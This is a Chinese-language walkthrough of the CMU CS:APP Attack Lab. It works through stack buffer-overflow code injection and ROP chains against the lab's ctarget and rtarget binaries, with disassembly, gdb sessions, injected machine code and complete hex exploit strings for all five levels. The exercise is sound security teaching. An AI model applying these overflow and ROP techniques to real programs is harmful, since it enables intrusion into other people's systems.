


# 实验前准备
* 去[这里](http://csapp.cs.cmu.edu/3e/target1.tar)下载单机版的实验文件
* 仔细阅读[官方攻略](http://csapp.cs.cmu.edu/3e/attacklab.pdf)，事半功倍（记住一定要看，里面有每关的任务描述和通关提示）！
* 最好使用Ubuntu12.04去做实验，因为实验文件中的可执行文件就是在这个环境下编译的。我一开始没有留意这点就在Fedora26上面做，程序一运行马上就报错。


## 第1关
### 任务概况
* 任务说明：当程序启动的时候，test函数会先调用getbuf函数，当getbuf执行完后会返回到test，我们的任务是通过特定的攻击，使得getbuf执行完毕不会返回到test，而是返回到目标函数touch1。
* 攻击方法：将栈上保存了test的返回地址的地方，修改为函数的touch1的起始地址。即最终我们需要将栈修改成如下图：  
![cl1.jpg](/imgs/attack_lab_cl1.jpg)
* 具体操作如下：  

### 步骤1：反汇编ctarget
```BASH
objdump -d  ctarget
```

### 步骤2：构造攻击字符串
找到getbuf的汇编代码（我将关键部分都加上了注释）
 ```x86asm
		1	  4017a8:	48 83 ec 28          	sub    $0x28,%rsp	;分配栈空间，共40个字节
		2	  4017ac:	48 89 e7             	mov    %rsp,%rdi	;给Gets传参，说明缓冲区紧贴着栈的顶端
		3	  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>	;调用Gets读取输入到缓冲区
		4	  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax	;设定返回值
		5	  4017b9:	48 83 c4 28          	add    $0x28,%rsp	;回收栈空间
		6	  4017bd:	c3                   	retq   
		7	  4017be:	90                   	nop
		8	  4017bf:	90                   	nop
 ```


 从第一行可以看到，栈空间大小为40个字节，而getbuf执行完毕之后的返回值就存储在这40个字节前面。因此我们只需要设计一个字符串：  
 **它的大小为48个字节，前40个字节用来填满缓冲区，则后8个字节就会溢出从而覆盖了原来的返回地址**。于是我们可以设计输入如下：  
```C
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
c0 17 40 00 00 00 00 00
```
这个多行字符串有以下特点：
* 共有6行，每行8个数字，每个数字用两位的16进制数字表示（代表1个字节），数字间用空格隔开。
* 它代表6*8=48个字节，前5行（40个字节）**用来填充getbuf的缓冲区，后1行用来覆盖getbuf执行完毕之后的返回地址**。
* 前40个字节内容随意指定，我们这里全部用0填充，后8位必须是函数touch1的起始地址。从ctarget的反汇编中中容易找到touch1的起始地址为4017c0，将其用小端法表示，不足部分用0补全，即可得到c0 17 40 00 00 00 00 00 

### 步骤3：实施攻击
将上述字符串保存为cl1.txt，然后执行以下命令即可通关
```bash
./hex2raw < cl1.txt | ./ctarget -q 
```




---








## 第2关
### 任务概况
* 任务说明：和第1关类似，但是这次是返回到目标函数touch2，并且通过touch2的检测。
* 攻击方法：和第1关类似，将返回地址修改为攻击代码的地址，攻击代码修改edi寄存器的值，再跳转到touch2函数。即最终我们需要将栈修改成如下图：  
![cl1.jpg](/imgs/attack_lab_cl2.jpg)
* 具体操作如下：
### 步骤1：生成攻击的汇编代码
根据攻略，传递给touch2的参数存储在文本cookie.txt中，它的值为0x59b997fa（其实也可以完全不需要cookie.txt，直接从touch2中debug出需要的参数的值，不过这样太麻烦），因此我们可以用以下汇编来实现调用touch2并且给它传参
```x86asm
mov $0x59b997fa, %edi 		#设置edi的值
pushq $0x4017ec 		#将函数touch2的地址压栈
retq 				#返回，将会自动跳转到touch2的地址
```
将其保存为文本cl2.s，编译并反汇编
```bash
gcc -c cl2.s 
objdump -d cl2.o 
```

最终得到它的16进制的表示如下
```x86asm
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3   
```
这就是我们的攻击代码，怎么让这段代码跑起来？简单来说分为以下几步（可以参照第一关的方法）：
* 首先要用这段代码填充到缓冲区。
* 然后覆盖test执行完毕之后会用到的返回地址，使其指向我们的攻击代码。

### 步骤2：计算攻击代码在缓冲区的地址
但是我们现在还不知道缓冲区的地址，因此需要debug一下以获取它。新建cl2.txt输入以下内容并保存：
```C
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
a8 17 40 00 00 00 00 00
```


然后按照以下方法debug
```bash
./hex2raw < cl2.txt > cl2.bin 	#为了方便gdb调试，我们先将二进制内容保存到另外一个文件
gdb ctarget #启动gdb

#这里省略若干行gdb的输出
.
.
.
(gdb) break * 0x4017a8		#在getbuf中设置断点
Breakpoint 1 at 0x4017a8

(gdb) run < cl2.bin -q 		#以cl2.bin为输入启动程序
(gdb) print /x $rsp		#显示栈顶的值 ，也是缓冲区的顶端
$1 = 0x5561dca0
```
0x5561dca0就是缓冲区的顶端（我们将缓冲区的顶端、低端与栈的顶部底部方向保持一致），因此0x5561dca0 - 0x28 = 0x5561dc78就是攻击代码需要插入的地方（也即缓冲区顶端）。

### 步骤3：生成攻击字符串
因此我们修改cl2.txt的内容如下：
```C
bf fa 97 b9 59 68 ec 17  
40 00 c3 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
78 dc 61 55 00 00 00 00  
```
前两行是我们的攻击代码（来源于上面的cl2.o），不足部分用0补全；最后一行是程序的返回地址，攻击代码将会插入到由最后一行的数字所指定地址的内存中。然后执行以下命令即可通关

```bash
./hex2raw < cl2.txt | ./ctarget -q 
```

---


## 第3关
### 任务概况
* 任务说明：和第2关类似，但是这次是返回到目标函数touch3，并且通过touch3的检测。
* 攻击方法：和第2关类似，将返回地址修改为攻击代码的地址，攻击代码设置好传递给touch3的参数，再跳转到touch3函数。和第2关不同，攻击代码除了设置好寄存器之外，还要将字符串的内容放到getbuf的栈中。而难点是：当getbuf调用完毕之后，绿色部分栈空间被回收，而跟着调用的touch3、hexmatch、strncmp函数的会使用绿色部分的栈空间，从而导致攻击代码放置的字符串被破坏。因此攻击代码除了放置字符串外，还需要将栈指针指向灰色的未使用空间处，这样后续的函数在使用栈空间的时候，就不会破坏绿色处的字符串。  
（其实我们可以将字符串放到test的栈中，这种方法也是可以的，不过这样会破坏掉test的栈空间，不过此时已经没有关系了，因为test不会再被调用）  
因此最终我们需要将栈修改成如下图：  
![cl1.jpg](/imgs/attack_lab_cl3.jpg)
* 具体操作如下：

### 步骤1：编写攻击代码。
编写以下攻击代码，注意参照上图，我们将所需的字符串放置在地址为0x5561dc88的地方，注意字符串后面必须要有0作为终结符。
```x86asm
mov $0x5561dc88, %edi 	# 设置edi的值为字符串的地址
subq $0x50, %rsp 	# 强行移动栈顶，使得设置的字符串不会因为后续的函数调用而破坏
pushq $0x4018fa		# 将函数touch3的地址压栈
retq 			# 返回，将会自动跳转到touch3的地址

```


### 步骤2：生成攻击字符串
将其保存为文本cl2.3，编译并反汇编
```bash
gcc -c cl2.3 
objdump -d cl3.o 
```

最终得到它的16进制的表示如下
```x86asm
   0:	bf 87 dc 61 55       	mov    $0x5561dc87,%edi
   5:	48 83 ec 50          	sub    $0x50,%rsp
   9:	68 fa 18 40 00       	pushq  $0x4018fa
   e:	c3                   	retq   
```
仿照第2关的方法生成攻击字符串，将以下内容保存到cl3.txt，前2行是攻击代码，第3行是我们放置到缓冲区的字符串，第6行是getbuf运行完毕之后需要跳转到的地址
```C
bf 88 dc 61 55 48 83 ec
50 68 fa 18 40 00 c3 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

运行以下代码即可通关
```BASH
./hex2raw < cl3.txt | ./ctarget -q
```

---
## 第4关
前面3关的攻击方式是代码注入，但是DEP（Data Execution Prevention）和ASLR（Address Space Layout Randomization）可以很好地防御这种攻击。但是道高一尺魔高一丈，ROP的出现使得攻击手法更加高明，当我第一次看到ROP的时候不禁感叹人类的聪明才智真是璀璨。

### ROP简要说明
简单来说，ROP是利用已经存在于系统的合法代码片段（gadget），组成一个执行链来实现攻击，如下图所示：
![cl1.jpg](/imgs/attack_lab_rl1.jpg)


图中黄色部分是内存中合法的代码片段，栈中存有它们的地址，只要我们让代码片段1执行，那么剩下的代码片段2、3...n都会得到执行，而这些代码片段都是攻击者精心挑选的，联合起来执行刚好能达到某种目的。为何代码片段能够连接起来顺序执行呢？这是因为:  

**每个代码片段的最后一条指令都是ret，当*代码片段n*的ret执行之后就从栈中弹出*代码片段n+1*的地址，根据这个地址找到*代码片段n+1*并加以执行，如此类推就可以执行完所有的代码片段**。

因此ROP攻击流程是：
* 扫描系统，从中获取特定的代码片段，它们都是以ret指令结尾
* 将这些代码片段的地址收集起来放到栈中
* 想方法让第1个代码片段执行起来

### 任务概况
* 任务说明：和第2关一样，但是这次使用的程序是rtarget，并且无法使用代码注入。
* 攻击方法：使用ROP，首先要找到有效的攻击代码及其地址，然后通过缓冲区溢出修改程序的返回地址为代码片段的地址。

* 具体操作如下：
### 步骤1：找出需要利用的代码片段的地址
参考cl2.s，我们首先要找出给edi寄存器赋值的代码，给edi赋值有多重方式，pop和mov都可以。如果使用pop指令，则需要找出的代码片段功能应该类似这样：
```x86asm
popq %rdi ;将cookie的值从栈中弹到rdi寄存器中，为touch2传参做准备
ret	;调用touch2
```

从攻略中的附录B可知，popq %rdi的编码为5f，而ret的指令编码为c3，因此我们需要在rtarget中查找5f c3。  
反汇编rtarget并查找该字符串
```bash
objdump -d rtarget | grep '5f c3'
401419:	69 c0 5f c3 00 00    	imul   $0xc35f,%eax,%eax
```
可知内存中0x401419位置的代码可以拆分为我们需要的5f c3，它的地址就是0x401419 + 2 = 0x40141b，因此代码片段的位置确定了。

### 步骤2：生成攻击字符串
结合找到代码片段的功能，我们可以知道栈需要以下布局以配合代码的执行：  
![rl1.jpg](/imgs/attack_lab_rl1_1.jpg)

因此我们最终生成以下字符串：  
```c
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
1b 14 40 00 00 00 00 00  
fa 97 b9 59 00 00 00 00  
ec 17 40 00 00 00 00 00  
```
将上述字符串保存到rl1.txt，然后执行以下命令即可通关。
```bash
./hex2raw < rl1.txt | ./rtarget -q
```

其实通关攻略中提示我们所需的代码片段位于start_farm和mid_farm之间，然而从以上的分析来看并不如此。因为我们利用的代码段是位于scramble函数，并不在start_farm和mid_farm之间。


## 第5关
开始之前总结几个ROP攻击的注意事项：
* 不要误把攻击的代码(gadget)的空间和栈空间混在一起（做久了头脑迷糊很容易这样），gadget是位于内存中固定的地方，无法改变。而栈空间位于内存中另外一处。
* 因gadget的最后一个指令是ret，因此执行gadget的时候，**当前栈顶保存的必定是下一条指令的地址**，除非ret指令之前有涉及移动栈指针的指令，例如push和pop等。
* 确定输入的字符串的地址，可以先保存当前gadget的rsp到某个寄存器r，然后再寻找另外一段对寄存器加减一个偏移量的gadget。这个技巧很重要，我就是卡在这里出不来。

### 任务概况
* 任务说明：和第3关一样，但是这次使用的程序是rtarget，并且无法使用代码注入。
* 攻击方法：使用ROP，需要找到并串联能够实现以下功能的gadget  
	* 将字符串地址的值赋予rdi寄存器
	* 返回到touch3函数
* 具体操作如下：

因为DEP和ALSR，无法像前几关那样设置好字符串之余还能获取字符串的地址，因此我们需要通过代码去获取字符串的地址。根据第3关的经验，字符串地址必定是在当前栈顶的下方，但是具体偏移量还不知道，我们假设它为n，即字符串的位置是rsp + n 。
现在需要将rsp+n的地址值复制到rdi，这显然至少需要两步：
第一步将rsp复制到rdi，第二步rdi自增一个偏移量n。 

### 步骤1：保存栈地址到rdi寄存器  
然而rtarge中并没有直接将rsp复制到rdi的gadget，但是可以找到复制rsp到rax和复制rax到rdi的rtarget，因此我们可以用这两个指令来实现第一步。
```x86asm
	movq %rsp, %rax;//位于rtarget的401a06
	movq %rax, %rdi;//位于rtarget的4019a2
```


### 步骤2：rdi自增偏移量n  
第二步是将rsp自增一个偏移量n。偏移量n目前未知并且gadget中恰好含有我们需要的常量可能性很低，因此我们需要**手动将n存于当前的栈顶，然后pop出来以供后面使用**。pop指令在这里作用很关键，它不仅将n保存到寄存器，还将栈指针移动，使得紧跟着的ret指令能够达到下一个gadget，如果不用pop而用mov，则接下来的ret就会以n为地址跳转，这明显是不正确的。那究竟是pop到哪个寄存器呢，经过查找发现rtarget中只有pop到rax的。
```x86asm
	popq %rax;//位于rtarget的4019ab
```

但是n的值还是不确定，我们暂且不管继续往下看。剩下就是把rax加到rdi了，这可以用add或者lea指令。经查找rtarget中没有对应add指令但有lea指令gadget，那么确定使用lea指令对rdi自增。然而lea指令跟寄存器的组合种类实在太多了，一种种尝试太浪费时间，这时候我们仔细看看rtarget的反汇编，发现里面有一处是:
```x86asm
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```
这就是告诉我们必须要用这种寄存器的组合来自增了（说实话这个地方非常考验观察能力），于是我们想办法把rax的值复制到rsi，找了一下没有直接的gadget支持，但是找到其它3条替代的指令
```x86asm
   movl %eax, %edx  ;位于rtarget的4019dd
   nop
   movl %edx, %ecx  ;位于rtarget的401a69
   or   %bl,%bl
   movl %ecx, %esi  ;位于rtarget的401a27
   cmp  %al,%al
```
这样就实现了将rax复制到rsi，最后我们再执行上面的lea指令，再找一个复制rax到rdi的gadget，
```x86asm
   movq %rax, %rdi  ;位于rtarget的4019a2
```
就确定了全部gadget，然后根据这个再算出n为0x48（总共8条指令+1个常数，8*9=72=0x48），最终栈中的内容为：

![rl2.jpg](/imgs/attack_lab_rl2_3.jpg)  
于是我们新建文本rl2.txt并输入以下内容
```c
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
06 1a 40 00 00 00 00 00    
a2 19 40 00 00 00 00 00  
ab 19 40 00 00 00 00 00   
48 00 00 00 00 00 00 00    
dd 19 40 00 00 00 00 00    
69 1a 40 00 00 00 00 00   
27 1a 40 00 00 00 00 00    
d6 19 40 00 00 00 00 00   
a2 19 40 00 00 00 00 00   
fa 18 40 00 00 00 00 00  
35 39 62 39 39 37 66 61
```
然后执行以下命令即可通关
```bash
./hex2raw < rl2.txt | ./rtarget -q
```

PS：我一开始死脑筋认为n就是1，也就说紧靠着栈顶，结果悲剧了，其实n为1也不是不可以，但是farm.c中没有对应的gadget来配合这种情况，根据ROP的原理可以推测，栈中连续放置着一系列gadget的地址，如果地址中间又夹杂着一些非地址的数据则非常麻烦，此时需要push或者pop之类的指令来配合使得栈指针跳过这些数据，然而这要的gadget不太好找。总结这关的难点就是你的思路不一定有gadget可以支持，那么此时你就需要绕来绕去，以找到适合的gadget，而这过程非常繁琐。因此在攻击展开前，最好**有工具能扫描一下可利用的代码，列出可利用的指令**，则不用费劲去猜想了，而现实攻击中通常是会去扫描并利用libc的，ROP的厉害之处是只要系统有一处地方存在缓冲区溢出，则可以实施攻击。 